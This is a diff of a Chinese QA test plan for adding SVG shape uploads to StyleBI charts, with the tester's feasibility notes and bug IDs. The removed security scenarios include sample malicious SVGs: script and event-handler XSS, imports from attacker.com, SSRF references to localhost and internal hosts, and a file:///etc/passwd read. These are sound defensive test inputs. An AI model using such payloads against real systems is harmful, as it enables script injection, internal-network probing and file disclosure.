+**Key Steps**：
+1. 初始化 Dashboard，查看图表中的 SVG Shape
+2. 应用过滤器（如选择特定的地区或时间范围）
+3. 验证图表数据和 SVG Shape 是否同步刷新
+4. 验证刷新过程中是否出现闪烁或加载延迟
+5. 执行钻取操作（如从年份钻取到月份）
+6. 验证钻取后的新数据中的 SVG Shape 是否正确显示
 
-4. **缓存效率**
-   - ✅ 同一 SVG Shape 重复使用，是否有缓存
-   - ✅ 验证缓存命中率
+**Expected Result**：
+- ✅ 应用过滤器后，图表数据和 SVG Shape 同时刷新，保持同步
+- ✅ 无异步加载导致的数据-UI 不一致
+- ✅ 刷新动画流畅，无卡顿
+- ✅ 钻取操作正确，SVG Shape 适应新数据
 
----
-
-#### 🔄 集成测试策略    **测试-执行**：可行，拿到了知识库
-
-**动机**：SVG 需与现有 Chart 功能无缝配合
-
-**测试清单**：
-
-1. **Filter + SVG**
-   - ✅ Chart 应用 Filter 后，SVG Shape 正确更新
-   - ✅ Filter 交互无延迟
-
-2. **Drill + SVG**
-   - ✅ Chart Drill 操作，SVG Shape 数据正确更新
-   - ✅ Drill 返回后，SVG 显示还原
-
-3. **多 Chart 并行**
-   - ✅ Dashboard 中多个 Chart 同时使用 SVG Shape，无冲突
-   - ✅ 验证资源竞争（如缓存）无问题
-
-4. **Scheduler + SVG**
-   - ✅ Scheduled Task 生成包含 SVG Shape 的报表
-   - ✅ 邮件发送的报表中 SVG 正确显示
-
-5. **权限 + SVG**
-   - ✅ 全局 SVG Shape，不同用户可访问
-   - ✅ 组织级 SVG Shape，权限隔离正确
+**Risk Covered**：
+- ✅ SVG 动态刷新的功能正确性
+- ✅ 数据一致性
+- ✅ Dashboard 与 Chart 的交互一致性
 
 ---
 
-### 3. 回归风险分析   **测试-执行**：可行，分析的还可以
+### **Scenario 7：复杂 SVG 渲染性能**  >**分析**：覆盖了性能
 
-#### 📉 可能受影响的模块及回归优先级
+**Scenario Objective**：
+验证包含复杂路径、滤镜、阴影等高级特性的 SVG 在图表中批量渲染时的性能表现。
 
-| 模块 | 影响原因 | 回归优先级 | 测试内容 |
-|------|---------|---------|---------|
-| **Chart Rendering** | SVG 新增渲染路径，可能影响现有光栅 Shape 渲染 | P0 | 确保 JPG/PNG/GIF Shape 仍正常显示 |
-| **Shape Repository** | 存储结构可能变化（新增 SVG 类型字段） | P0 | 数据迁移、向后兼容性 |
-| **Upload Validator** | 验证逻辑扩展，可能影响其他格式 | P1 | 确保 JPG/PNG/GIF 仍能上传 |
-| **Export Module** | 导出逻辑可能修改，影响现有导出功能 | P1 | PDF/Image 导出仍正常，不出现 SVG 相关错误 |
-| **Dashboard Editor** | UI 可能调整，影响现有 Shape 选择器 | P1 | Shape 选择器仍可正常操作，无 UI 损坏 |
-| **Chart Filter/Drill** | 数据交互逻辑，检查 SVG Shape 场景 | P2 | Filter/Drill 与 SVG Shape 协调 |
-| **Performance** | SVG 渲染可能影响整体 Chart 性能 | P2 | 监控 Chart 加载时间，确保无显著下降 |
-| **Mobile/Responsive** | 响应式设计，SVG 适配 | P2 | 移动设备上 SVG 显示、交互正常 |
+**Risk Level**：
+🟠 **Medium** - 性能风险，可能导致界面卡顿
 
----
+**Scenario Description**：
+使用复杂 SVG（如多层路径、渐变、滤镜）和大量数据点，验证图表的渲染性能。
 
-### 4. 本地化与可用性分析  **测试-分析**: 之前我们没做没有提示，非prompts问题，先忽略。如果格式bug验证做了这个可执行
+**Pre-condition**：
+- 准备复杂 SVG 文件（如含有多条贝塞尔曲线、滤镜效果的图形）
+- Point Chart 配置有 1000+ 数据点
 
-#### 🌐 本地化需求
+**Key Steps**：
+1. 上传复杂 SVG 到系统
+2. 将其应用到包含大量数据点的 Chart
+3. 打开 Dashboard 并记录首次加载时间（从浏览器开发者工具的 Performance 标签）
+4. 与使用简单 PNG 的相同图表对比加载时间
+5. 验证交互响应速度（如鼠标悬停、缩放）
 
-**本次修改涉及 UI 变更**（新增 SVG 格式支持），需要本地化验证：
+**Expected Result**：
+- ✅ 图表加载时间在可接受范围内（建议 <2s）
+- ✅ 交互响应流畅，无明显卡顿
+- ✅ 浏览器内存占用在正常范围内，无内存泄漏迹象
+- ✅ CPU 占用不超过预期阈值
 
-**变更点**：
-- Shape 上传对话框可能新增提示：`"支持格式：JPG、PNG、GIF、**SVG**"`
-- 错误提示可能包含：`"SVG 文件包含不允许的脚本，已被移除"`
-- 限制说明：`"SVG 内的动画和脚本将被禁用"`
-
-**本地化测试清单**：
-- ✅ 各语言（英文、中文、日文等）的 UI 标签正确显示
-- ✅ 错误提示在各语言环境下清晰易懂
-- ✅ 文档（PDF 导出时）的多语言说明
-
----
-
-#### 🖱️ Script 行为分析
-
-**是否涉及 Script 控制**？
-
-根据 Knowledge 和 Feature 描述，Shape 选择是手动操作或代码配置。需要验证：
-
-- ✅ 是否支持通过 Script（JavaScript/Python API）动态切换 SVG Shape
-- ✅ Script 事件是否触发（如 `onShapeChange`）
-- ✅ Script 与 UI 选择是否同步
-
-**如果不涉及 Script 控制**，则本部分无需扩展测试。
+**Risk Covered**：
+- ✅ SVG 复杂渲染性能风险
+- ✅ 系统性能和可用性
 
 ---
 
-### 5. 文档一致性与可用性分析  **测试-分析**: 可行
+### **Scenario 8：浏览器兼容性 - SVG 渲染差异**   >**分析**：覆盖了兼容和渲染
 
-#### 📚 文档更新需求
+**Scenario Objective**：
+验证 SVG Shape 在不同浏览器中的渲染一致性，特别是高级 SVG 特性（如滤镜、渐变）的兼容性。
 
-本次修改涉及**功能新增**（SVG 格式支持），需要更新文档：
+**Risk Level**：
+🟠 **Medium** - 跨浏览器兼容性问题可能影响部分用户
 
-**需要更新的文档**：
+**Scenario Description**：
+在多个主流浏览器中打开包含 SVG Shape 的 Dashboard，对比渲染结果。
 
-1. **产品文档**     
-   - 用户手册 → "自定义 Shape 功能" 章节
-   - 新增内容：SVG 格式支持说明、SVG 限制（无脚本、无外部资源）、上传方式、性能建议
-   - 示例：提供样本 SVG 文件
+**Pre-condition**：
+- 准备标准 SVG 文件（包含基础和高级特性）
+- 测试环境覆盖主流浏览器：Chrome、Firefox、Safari、Edge
 
-2. **API 文档**（如果有 Chart API）
-   - Shape 类型枚举扩展（新增 `ShapeFormat.SVG`）
-   - 新增 SVG 上传 API 端点说明
+**Key Steps**：
+1. 在每个浏览器中打开相同的 Dashboard
+2. 截图记录 SVG Shape 的渲染效果
+3. 对比各浏览器中的渲染差异
+4. 验证交互功能（如悬停提示、点击事件）
 
-3. **管理员文档**  
-   - 全局 Shape 库管理，新增 SVG 管理说明
-   - 性能优化建议（如：监控 Shape 库大小）
+**Expected Result**：
+- ✅ 所有浏览器中 SVG 渲染结果一致或差异在可接受范围内
+- ✅ 基础 SVG 特性（颜色、形状、尺寸）在所有浏览器中正确显示
+- ✅ 交互功能在所有浏览器中正常工作
 
-4. **Release Notes**
-   - 明确列出新增 SVG 支持、支持的 SVG 功能、已知限制
+**Risk Covered**：
+- ✅ 浏览器兼容性差异风险
+- ✅ 跨浏览器一致性
 
-**验证清单**：
-- ✅ 用户文档新增 SVG 支持说明
-- ✅ 安全限制明确说明（禁用脚本、禁用外部 URL）
-- ✅ 浏览器兼容性明确
-- ✅ 性能建议明确（如：建议 SVG 文件 < 50KB）
-- ✅ 常见问题（FAQ）覆盖 SVG 使用场景
-
----
-
-## 🎯 第四部分：关键测试场景设计（Key Test Scenarios）
-
-### 🔴 P0 - 高优先级高风险场景
+📅 报了Bug #74034：default size of svg can't apply
 
 ---
 
-### 测试场景 1：SVG XSS 防护验证   **测试-分析**: 可行，但是验证我们是否支持，等bug改了
+### **Scenario 9：系统升级后的向后兼容性**  >**分析**：覆盖了BC
 
-**测试目标（Scenario Objective）**  
-验证系统能正确识别和清理包含恶意脚本的 SVG，防止 XSS 攻击执行
+**Scenario Objective**：
+验证低版本 StyleBI 中创建的报表在升级到新版本后，如果其中包含 JPG/PNG Shape，是否仍正确加载和显示。
 
-**风险级别（Risk Level）**  
-🔴 **High** – XSS 漏洞可能导致数据泄露和会话劫持
+**Risk Level**：
+🔴 **High** - 升级后的兼容性破缺会导致用户数据不可用
 
-**测试场景描述**  
-用户上传包含 `<script>` 标签和事件处理器的恶意 SVG 文件，系统应拒绝或清理恶意内容，确保不执行任何脚本
+**Scenario Description**：
+从低版本（不支持 SVG）升级到新版本（支持 SVG），验证已有报表的正常工作。
 
-**前置条件（Pre-condition）**
-- 登录 StyleBI 为有效用户
-- 拥有 Dashboard/Chart 的编辑权限
-- 有网络连接和浏览器控制台可验证 XSS
+**Pre-condition**：
+- 低版本数据库备份包含使用 JPG/PNG Shape 的 Dashboard
+- 新版本已安装并完成升级迁移
 
-**关键步骤（Key Steps）**
+**Key Steps**：
+1. 升级系统到新版本
+2. 打开低版本创建的 Dashboard
+3. 验证图表中的 JPG/PNG Shape 是否正确加载和显示
+4. 尝试编辑这些 Shape（如调整大小、替换）
+5. 验证是否能新增 SVG Shape
 
-1. 准备恶意 SVG 文件 1：`evil_script.svg`
-   ```xml
-   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
-     <circle cx="50" cy="50" r="40"/>
-     <script>alert('XSS')</script>
-   </svg>
-   ```
+**Expected Result**：
+- ✅ 低版本的 JPG/PNG Shape 正确加载，无损坏或丢失
+- ✅ 编辑和替换操作正常工作
+- ✅ 可以新增 SVG Shape 而不影响既有 Shape
 
-2. 在 Dashboard Editor → Chart Shape 选择对话框中，上传 `evil_script.svg`
-
-3. 验证系统响应：
-   - 记录上传是否被接受/拒绝
-   - 如接受，检查存储的 SVG 内容是否仍包含 `<script>` 标签
-   - 加载 Chart 并观察浏览器控制台，确认没有 `alert('XSS')` 执行
-
-4. 重复步骤 1-3，测试其他恶意变体：
-   - `<rect onclick="alert('click')"/>`
-   - `<image onerror="alert('error')"/>`
-   - `<style>@import url('http://attacker.com/payload.css');</style>`
-
-5. 验证错误提示（如果上传被拒）：
-   - 是否清晰说明原因（如："SVG 包含不允许的脚本"）
-   - 是否指导用户如何修复
-
-**预期结果（Expected Result）**
-
-✅ 所有恶意 SVG 被拒绝上传，或脚本内容被完全清理  
-✅ 浏览器控制台无任何脚本执行迹象  
-✅ 错误提示清晰友好  
-✅ 系统日志记录恶意上传尝试（安全审计）
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| XSS 脚本注入 | 恶意 SVG 上传 + 渲染验证 | 脚本未执行、浏览器无错误 |
-| 脚本清理不彻底 | 检查存储内容 | SVG 文本中无 `<script>` 或事件处理器 |
-| 用户误用 | 验证错误提示 | 错误消息清晰指导 |
+**Risk Covered**：
+- ✅ 从低版本升级时的兼容性风险
+- ✅ 数据迁移一致性
 
 ---
 
-### 测试场景 2：SVG SSRF 防护验证  **测试-分析**: 可行，但是验证我们是否支持，等bug改了
+### **Scenario 10：SVG Shape 在全局 vs 组织级别的隔离**  >**分析**：覆盖了知识库的组织和global
 
-**测试目标（Scenario Objective）**  
-验证系统能阻止 SVG 引用外部 URL，防止 SSRF 攻击
+**Scenario Objective**：
+验证在多组织或多用户场景下，上传到全局和组织级别的 SVG Shape 是否被正确隔离和访问控制。
 
-**风险级别（Risk Level）**  
-🔴 **High** – SSRF 可能暴露内部服务和网络拓扑
+**Risk Level**：
+🟠 **Medium** - 多租户隔离风险
 
-**测试场景描述**  
-用户上传包含外部 URL 引用的 SVG（如 `<image>` 或 `<use>` 标签），系统应验证和移除所有外部 URI
+**Scenario Description**：
+在多组织环境中，Org-A 上传的 SVG Shape 不应被 Org-B 访问；全局 Shape 应对所有组织可见。
 
-**前置条件（Pre-condition）**
-- 登录 StyleBI，拥有 Chart 编辑权限
-- 准备测试用 SVG 文件（含外部 URL 引用）
+**Pre-condition**：
+- 系统配置支持多组织
+- 两个组织（Org-A、Org-B）已创建
+- 各组织有对应的管理员和普通用户
 
-**关键步骤（Key Steps）**
+**Key Steps**：
+1. 以 Org-A 管理员身份上传 SVG Shape 到组织级别
+2. 以 Org-B 管理员身份尝试访问 Org-A 的 Shape
+3. 验证是否能看到 Org-A 的 Shape（应该看不到）
+4. 以系统管理员身份上传 SVG Shape 到全局
+5. 以 Org-A 和 Org-B 的用户身份验证是否都能访问全局 Shape
 
-1. 准备 SSRF 测试 SVG：`ssrf_test.svg`
-   ```xml
-   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
-     <image href="http://localhost:8080/admin" width="100" height="100"/>
-   </svg>
-   ```
+**Expected Result**：
+- ✅ Org-B 用户无法访问 Org-A 的 Shape，系统显示"无权限"或 Shape 不显示
+- ✅ 全局 Shape 对所有组织用户可见
+- ✅ 无跨组织数据泄露
 
-2. 上传到 Shape 库
-
-3. 验证系统是否：
-   - 拒绝上传，或
-   - 接受上传但移除外部 URL
-
-4. 如果上传被接受，验证存储的 SVG：
-   - 获取 SVG 内容（API 或下载）
-   - 确认 `href="http://localhost:8080/admin"` 已被移除或失效
-
-5. 加载 Chart 并使用网络监控工具（如 Chrome DevTools），验证：
-   - 是否有向 `localhost:8080` 的 HTTP 请求
-   - 是否有向其他外部 IP 的请求
-
-6. 重复步骤 1-5，测试其他变体：
-   - `<use xlink:href="http://attacker.com/evil.svg#payload"/>`
-   - `<image href="file:///etc/passwd"/>`（XXE）
-   - `<foreignObject data="http://internal:8080/..."/>`
-
-**预期结果（Expected Result）**
-
-✅ 所有外部 URL 被拒绝或移除  
-✅ 网络监控工具无异常请求  
-✅ 系统日志记录 SSRF 防护事件  
-✅ 用户收到清晰的错误或警告
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| SSRF 外部 URL 引用 | 恶意 SVG + 网络监控 | 无外部 HTTP 请求 |
-| XXE 文件读取 | 包含 `file://` URL 的 SVG | 访问拒绝 |
-| URL 清理不彻底 | 检查存储的 SVG 文本 | 无外部 URL 存在 |
+**Risk Covered**：
+- ✅ 多租户隔离风险
+- ✅ 权限和安全管理
 
 ---
 
-### 测试场景 3：SVG 格式和文件类型验证  **测试-分析**: 可行
+### **Scenario 11：SVG 文件格式验证**  >**分析**：覆盖了异常和边界测试
 
-**测试目标（Scenario Objective）**  
-验证系统能正确检测 SVG 文件格式，防止文件类型欺骗
+**Scenario Objective**：
+验证系统能否正确识别和验证 SVG 文件格式，拒绝伪造的 SVG 文件（如重命名后的 PNG）。
 
-**风险级别（Risk Level）**  
-🔴 **High** – 类型欺骗可能绕过安全检查
+**Risk Level**：
+🟡 **Low** - 边界情况，但仍需覆盖
 
-**测试场景描述**  
-上传各种文件类型（正常 SVG、伪造 SVG、无效 SVG），验证系统的验证逻辑
+**Scenario Description**：
+尝试上传不同形式的文件，测试系统的格式验证机制。
 
-**前置条件（Pre-condition）**
-- 登录 StyleBI，拥有 Shape 上传权限
-- 准备多种测试文件
+**Pre-condition**：
+- 准备以下文件：
+  - 标准 SVG 文件（.svg）
+  - PNG 文件重命名为 .svg（mock）
+  - 纯文本文件重命名为 .svg（mock）
 
-**关键步骤（Key Steps）**
+**Key Steps**：
+1. 分别尝试上传各文件
+2. 验证系统的接受/拒绝行为
 
-1. **测试 1：正常 SVG 文件**
-   - 上传有效的 SVG 文件（`valid.svg`）
-   - 验证上传成功
+**Expected Result**：
+- ✅ 标准 SVG 正常上传
+- ✅ 伪造的 SVG（如重命名的 PNG）被拒绝或上传后在渲染时出现明确错误提示
+- ✅ 无损坏的图表或崩溃
 
-2. **测试 2：文件扩展名欺骗**
-   - 将 JPG 文件重命名为 `.svg`（如 `image.jpg` → `image.svg`）
-   - 上传该文件
-   - 验证系统是否拒绝（通过 Magic Number 检查）
+**Risk Covered**：
+- ✅ 文件格式验证的严密性
 
-3. **测试 3：无效 SVG 结构**
-   - 创建 `invalid.svg`：
-     ```xml
-     <svg>
-       <invalid_tag>...</invalid_tag>
-     </svg>
-     ```
-   - 上传并验证系统是否拒绝或警告
-
-4. **测试 4：损坏的 SVG**
-   - 创建 `corrupted.svg`（不完整的 XML）
-   - 上传并验证错误处理
-
-5. **测试 5：超大 SVG 文件**
-   - 创建 > 10MB 的 SVG 文件
-   - 上传并验证文件大小限制
-
-6. **测试 6：空 SVG 文件**
-   - 创建空白 `empty.svg`
-   - 上传并验证错误处理
-
-**预期结果（Expected Result）**
-
-✅ 正常 SVG 上传成功  
-✅ 文件���型欺骗被拒绝  
-✅ 无效 SVG 被拒绝并提示原因  
-✅ 损坏文件被拒绝  
-✅ 超大文件被拒绝  
-✅ 所有错误提示清晰
-
-**风险覆盖说明（Risk Covered）**  **测试-分析**: 可行，有bug
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| 文件类型欺骗 | 上传各种伪造 SVG | Magic Number 检查有效 |
-| 无效格式上传 | 损坏/无效 SVG | 拒绝率 100% |
-| 资源耗尽 | 超大文件上传 | 文件大小限制生效 |
+📅 报了Bug #74029：when upload svg(empty/invalid), show broken image and pop up error on background server
 
 ---
 
-### 🟡 P1 - 中优先级场景
+## 总结与测试优先级
+
+| 优先级 | Scenario | 原因 |
+|---|---|---|
+| **P0** | Scenario 1, 2, 9 | 核心功能、安全、兼容性 |
+| **P1** | Scenario 3, 5, 6, 10 | 常见功能、跨模块、多租户 |
+| **P2** | Scenario 4, 7, 8, 11 | 性能、浏览器兼容、边界情况 |
 
 ---
 
-### 测试场景 4：SVG 渲染与显示验证  **测试-分析**: 可行，有bug
-
-**测试目标（Scenario Objective）**  
-验证 SVG Shape 在 Chart 中正确渲染和显示
-
-**风险级别（Risk Level）**  
-🟡 **Medium** – 渲染错误影响用户体验和报表质量
-
-**测试场景描述**  
-创建多种 SVG 样式的 Chart，验证 SVG 在不同尺寸和颜色下正确显示
-
-**前置条件（Pre-condition）**
-- 已成功上传多个有效 SVG（简单、复杂、带渐变等）
-- 创建 Chart（如：散点图）
-- 浏览器：Chrome、Firefox、Safari 最新版本
-
-**关键步骤（Key Steps）**
-
-1. **测试 1：简单 SVG 显示**
-   - 创建散点 Chart，数据点 50+ 个
-   - 为所有数据点应用简单 SVG Shape（单个 `<circle>`）
-   - 验证所有点都正确显示 SVG（非光栅化）
-   - 检查 SVG 边界清晰，无锯齿
-
-2. **测试 2：复杂 SVG 显示**
-   - 应用复杂 SVG（多层 `<g>`、`<path>` 组合）
-   - 验证渲染正确，无变形或缺失部分
-   - 验证 SVG viewBox 正确映射到数据点
-
-3. **测试 3：带渐变的 SVG**
-   - 应用含 `<linearGradient>` 的 SVG
-   - 验证渐变效果正确显示
-
-4. **测试 4：SVG 尺寸适配**
-   - Chart 设置数据点大小为小（10px）
-   - 验证 SVG 缩小无失真
-   - Chart 设置数据点大小为大（50px）
-   - 验证 SVG 放大清晰
-
-5. **测试 5：响应式 SVG**
-   - 调整浏览器窗口大小（Desktop → Mobile 尺寸）
-   - 验证 SVG 自适应，显示正确
-   - 验证 Chart Legend 中 SVG 预览也正确显示
-
-6. **测试 6：SVG 与光栅 Shape 混用**
-   - 同一 Chart 中，某些数据点用 SVG，某些用光栅（JPG/PNG）
-   - 验证两种格式并行显示正确
-
-7. **测试 7：多个不同 SVG**
-   - 为不同数据组应用不同 SVG Shape
-   - 验证每组 SVG 正确显示和区分
-
-8. **浏览器兼容性**
-   - 在 Chrome、Firefox、Safari、Edge 中重复步骤 1-7
-   - 记录任何渲染差异
-
-**预期结果（Expected Result）**
-
-✅ 所有 SVG 在 Chart 中正确显示  
-✅ 缩放无失真（矢量优势）  
-✅ 响应式自适应  
-✅ 多个 SVG 不冲突  
-✅ 跨浏览器一致性  
-✅ 性能正常（无卡顿）
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| 渲染失败 | 各种 SVG 结构 | 100% 正确显示 |
-| 缩放失真 | 尺寸变化 | 矢量无损 |
-| 响应式问题 | 窗口大小改变 | 自适应正确 |
-| 浏览器兼容 | 多浏览器测试 | 一致性验证 |
-
----
-
-### 测试场景 5：SVG 导出到 PDF  **测试-分析**: 可行，有bug
-
-**测试目标（Scenario Objective）**  
-验证包含 SVG Shape 的 Chart 能正确导出为 PDF
-
-**风险级别（Risk Level）**  
-🟡 **Medium** – 导出失败导致报表生成失败，是高价值功能
-
-**测试场景描述**  
-导出包含 SVG Shape 的 Chart 为 PDF，验证导出结果、SVG 显示和文件大小
-
-**前置条件（Pre-condition）**
-- 创建包含 SVG Shape 的 Chart（100+ 数据点）
-- 验证 Chart 在浏览器中正确显示
-
-**关键步骤（Key Steps）**
-
-1. **测试 1：单个 Chart 导出**
-   - 右键点击 Chart → 导出为 PDF
-   - 验证导出成功，文件生成
-   - 打开 PDF，验证 SVG Shape 显示正确（应栅格化）
-   - 验证 PDF 大小合理（不应异常大）
-
-2. **测试 2：Dashboard 导出**
-   - Dashboard 包含多个包含 SVG Shape 的 Chart
-   - 导出整个 Dashboard 为 PDF
-   - 验证所有 SVG Shape 都正确显示
-
-3. **测试 3：复杂 SVG 导出**
-   - 应用复杂 SVG（多层、渐变），导出为 PDF
-   - 验证 SVG 复杂度不影响导出成功率
-   - 验证 PDF 中 SVG 细节保留
-
-4. **测试 4：大数据集导出**
-   - Chart 包含 1000+ SVG Shape 数据点
-   - 导出为 PDF
-   - 验证导出成功，无超时或内存溢出
-   - 监控导出时间（应 < 30s）
-
-5. **测试 5：导出失败处理**
-   - 模拟导出异常（如：磁盘满、权限不足）
-   - 验证用户收到清晰的错误提示
-   - 验证不会产生损坏的 PDF 文件
-
-6. **测试 6：导出格式对比**
-   - 同一 Chart 导出为 PDF 和 PNG
-   - 比对 SVG Shape 在两种格式中的显示效果
-   - 验证一致性
-
-**预期结果（Expected Result）**
-
-✅ 导出成功，PDF 生成正确  
-✅ SVG Shape 在 PDF 中显示清晰  
-✅ 导出时间合理（< 30s）  
-✅ PDF 文件大小合理  
-✅ 错误处理友好  
-✅ 大数据集导出不失败
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | ��证点 |
-|------|---------|--------|
-| 导出失败 | 各种 Chart 和 SVG | 100% 导出成功 |
-| 性能问题 | 大数据集导出 | 时间 < 30s |
-| 文件质量 | PDF 内容验证 | SVG 清晰显示 |
-| 错误处理 | 导出异常模拟 | 用户提示清晰 |
-
----
-
-### 测试场景 6：SVG 性能基准测试  **测试-分析**: 需简化
-
-**测试目标（Scenario Objective）**  
-验证 SVG 在大数据集场景下的渲染性能，确保不低于光栅 Shape
-
-**风险级别（Risk Level）**  
-🟡 **Medium** – 性能问题导致 DoS 和用户体验差
-
-**测试场景描述**  
-逐步增加 Chart 数据点，测量 SVG 和光栅 Shape 的加载时间、内存占用和帧率
-
-**前置条件（Pre-condition）**
-- 准备相同内容的 SVG 和 PNG Shape（如：同一图标）
-- 浏览器：Chrome 最新版本，开启 DevTools Performance 监控
-- 测试环境：固定硬件配置（CPU、内存、网络）
-
-**关键步骤（Key Steps）**
-
-1. **测试 1：100 数据点基准**
-   - 创建散点 Chart，100 个数据点，应用 SVG Shape
-   - 记录加载时间（首屏显示时间）
-   - 记录内存占用（DevTools Memory）
-   - 目标：加载时间 < 200ms
-
-2. **测试 2：500 数据点基准**
-   - 同上，500 个数据点
-   - 目标：加载时间 < 1s
-
-3. **测试 3：1000 数据点基准**
-   - 同上，1000 个数据点
-   - 目标：加载时间 < 2s
-   - 记录帧率（FPS）
-
-4. **测试 4：5000 数据点压力测试**
-   - 5000 个数据点
-   - 验证系统是否卡顿或崩溃
-   - 如果卡顿，建议启用虚拟化渲染
-
-5. **测试 5：SVG vs 光栅对比**
-   - 同一 Chart，分别使用 SVG 和 PNG Shape
-   - 对比加载时间、内存、帧率
-   - SVG 性能不应显著低于光栅
-
-6. **测试 6：交互性能**
-   - 大数据集 Chart（1000+ 点），应用 SVG Shape
-   - 验证鼠标悬停 Tooltip 响应延迟 < 100ms
-   - 验证缩放、拖拽操作帧率 > 30fps
-
-7. **测试 7：缓存效率**
-   - 多次加载同一 SVG Shape
-   - 验证第二次加载显著快于第一次（缓存生效）
-   - 记录缓存命中率
-
-**预期结果（Expected Result）**
-
-✅ 100 点：加载时间 < 200ms  
-✅ 500 点：加载时间 < 1s  
-✅ 1000 点：加载时间 < 2s  
-✅ 内存占用合理，无内存泄漏  
-✅ 帧率 > 30fps，交互流畅  
-✅ 缓存命中率 > 80%  
-✅ SVG 性能与光栅基本相当或更优
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| 渲染卡顿 | 大数据集加载测试 | 时间达标 |
-| 内存溢出 | 内存占用监控 | 无内存泄漏 |
-| 交互延迟 | 交互性能测试 | 响应 < 100ms |
-| 缓存问题 | 重复加载 | 命中率 > 80% |
-
----
-
-### 测试场景 7：SVG + Chart Filter 组合验证  **测试-分析**: 可行，不错
-
-**测试目标（Scenario Objective）**  
-验证 SVG Shape 与 Chart Filter 操作无冲突，Filter 应用后 SVG 数据正确更新
-
-**风险级别（Risk Level）**  
-🟡 **Medium** – Filter 失效或 SVG 错乱影响数据准确性
-
-**测试场景描述**  
-在包含 SVG Shape 的 Chart 上应用多种 Filter，验证 SVG 显示和数据一致性
-
-**前置条件（Pre-condition）**
-- 创建包含多个维度和指标的 Chart（如：按地区和销售额）
-- 应用 SVG Shape 代表不同数据点
-- 添加 Filter 控件（如：地区下拉框）
-
-**关键步骤（Key Steps）**
-
-1. **测试 1：简单 Filter 应用**
-   - Chart 显示所有数据，SVG Shape 正确显示
-   - 从 Filter 下拉框选择 "华东地区"
-   - 验证 Chart 只显示华东地区数据
-   - 验证 SVG Shape 数量和颜色正确更新
-   - 验证过滤后的 SVG Shape 位置正确
-
-2. **测试 2：多条件 Filter**
-   - 同时应用地区和销售额范围 Filter
-   - 验证 Chart 和 SVG Shape 都正确过滤
-   - 验证 SVG 数据与 Filter 条件一致
-
-3. **测试 3：Filter 清除**
-   - 应用 Filter 后，清除 Filter
-   - 验证 Chart 恢复完整数据
-   - 验证 SVG Shape 数量和排列恢复原样
-
-4. **测试 4：Filter 切换**
-   - 快速切换 Filter 值（如：地区从 "华东" → "华北" → "华东"）
-   - 验证 SVG Shape 正确跟随切换
-   - 验证无数据混乱或 SVG 残留
-
-5. **测试 5：Filter 交互延迟**
-   - 记录 Filter 应用到 SVG 更新的时间间隔
-   - 目标：延迟 < 500ms（用户无感知）
-
-6. **测试 6：大数据集 Filter**
-   - Chart 原始数据 10000+ 行
-   - 应用 SVG Shape
-   - 应用 Filter 过滤到 100 行
-   - 验证过滤和 SVG 更新成功
-
-**预期结果（Expected Result）**
-
-✅ Filter 应用后 SVG Shape 正确更新  
-✅ 过滤数据与 SVG 显示一致  
-✅ Filter 切换无 SVG 数据混乱  
-✅ 交互延迟 < 500ms  
-✅ 大数据集过滤不失败
-
-**风险覆盖说明（Risk Covered）**
-
-| 风险 | 覆盖方式 | 验证点 |
-|------|---------|--------|
-| Filter 失效 | 各种 Filter 条件 | 100% 生效 |
-| SVG 数据不同步 | 过滤前后数据对比 | 完全同步 |
-| 交互延迟 | 时间测量 | < 500ms |
-| 大数据处理 | 10000+ 行过滤 | 成功无失败 |
-
----
-
-### 🟢 P2 - 低优先级场景
-
----
-
-### 测试场景 8：SVG 版本升级兼容性   **测试-分析**: 对于下个版本可行，目前新增加可忽略版本兼容
-
-**测试目标（Scenario Objective）**  
-验证旧版本 Dashboard（创建于 SVG 支持前）升级后能正确加载 SVG Shape，或有合理 Fallback
-
-**风险级别（Risk Level）**  
-🟢 **Low** – 但影响用户升级体验
-
-**测试场景描述**  
-模拟从不支持 SVG 的旧版本升级到新版本，验证数据迁移和向后兼容性
-
-**前置条件（Pre-condition）**
-- 准备旧版本数据库备份（不含 SVG Shape）
-- 新版本部署完成
-
-**关键步骤（Key Steps）**
-
-1. **测试 1：旧版本 Dashboard 加载**
-   - 恢复旧版本数据
-   - 在新版本中打开旧 Dashboard（仅包含 JPG/PNG Shape）
-   - 验证 Chart 正常显示，Shape 无缺失
-
-2. **测试 2：混合 Shape 显示**
-   - 旧 Dashboard 中的 JPG/PNG Shape 正常显示
-   - 新增 SVG Shape 到同一 Chart
-   - 验证两种 Shape 并行显示无冲突
-
-3. **测试 3：新版本创建的 SVG 回滚**
-   - 在新版本中创建包含 SVG Shape 的 Chart
-   - 回滚到旧版本
-   - 验
-
-
-
+**报告完成**。如需详细的测试用例脚本、自动化脚本框架或特定浏览器/版本的测试矩阵，请提出。
